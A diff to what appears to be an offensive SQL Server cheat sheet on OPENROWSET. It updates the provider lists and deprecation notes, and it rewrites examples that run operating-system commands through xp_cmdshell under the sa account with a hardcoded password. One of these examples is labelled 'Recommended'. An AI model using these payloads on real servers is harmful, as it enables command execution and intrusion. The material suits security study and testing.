@@ -25,7 +25,9 @@ SELECT * FROM OPENROWSET(
 
 Common providers:
 
-- 'SQLNCLI' (SQL Server Native Client)
+- 'MSOLEDBSQL' (Microsoft OLE DB Driver for SQL Server — recommended for SQL Server 2017+)
+- 'SQLNCLI' / 'SQLNCLI11' (SQL Server Native Client — deprecated, removed in SQL Server 2022)
+- 'SQLOLEDB' (Legacy OLE DB Provider — deprecated since SQL Server 2012, retained for backward compatibility)
 - 'Microsoft.ACE.OLEDB.12.0' (Access, Excel)
 - 'MSDASQL' (ODBC)
 
@@ -67,11 +69,22 @@ SELECT * FROM OPENROWSET(
 )
 ```
 
-**Note:** SQLOLEDB is deprecated; prefer SQLNCLI or MSOLEDBSQL. SQLOLEDB may not be available in SQL Server 2019+.
+**Legacy Provider Note:** SQLOLEDB has been deprecated since SQL Server 2012 and receives no security updates or bug fixes. It remains available on Windows for backward compatibility but is unmaintained. For SQL Server 2019+, use **MSOLEDBSQL** (Microsoft OLE DB Driver) or modern ODBC drivers instead.
 
 ```sql
--- Using SQLOLEDB provider with command execution (legacy, may not work on newer versions)
-SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=127.0.0.1;uid=sa;pwd=p4ssw0rd;', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
+-- SQLOLEDB example (legacy/educational — no vendor support on current SQL Server versions)
+SELECT * FROM OPENROWSET(
+    'SQLOLEDB',
+    'Server=127.0.0.1;uid=sa;pwd=p4ssw0rd;',
+    'SET FMTONLY OFF execute master..xp_cmdshell "dir"'
+);
+
+-- Recommended: Use MSOLEDBSQL on SQL Server 2017+
+SELECT * FROM OPENROWSET(
+    'MSOLEDBSQL',
+    'Server=127.0.0.1;uid=sa;pwd=p4ssw0rd;',
+    'SET FMTONLY OFF execute master..xp_cmdshell "dir"'
+);
 ```
 
 #### File System Access
